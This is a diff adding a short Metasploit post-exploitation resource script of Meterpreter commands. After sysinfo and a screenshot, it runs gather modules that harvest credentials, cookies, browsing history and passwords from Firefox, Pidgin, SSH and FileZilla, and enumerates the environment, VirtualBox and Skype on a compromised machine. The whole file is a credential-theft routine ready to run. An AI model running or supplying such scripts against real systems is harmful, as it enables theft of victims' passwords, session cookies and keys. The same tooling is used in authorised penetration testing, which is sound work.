@@ -1,0 +1,12 @@
+sysinfo
+screenshot -v -p multigather.jpeg -v true
+run post/multi/gather/env
+run post/multi/gather/firefox_creds
+run post/multi/gather/enum_vbox
+run post/multi/gather/pidgin_cred
+run post/multi/gather/skype_enum
+run post/multi/gather/ssh_creds
+run post/multi/gather/filezilla_client_cred
+run post/firefox/gather/cookies
+run post/firefox/gather/history
+run post/firefox/gather/passwords
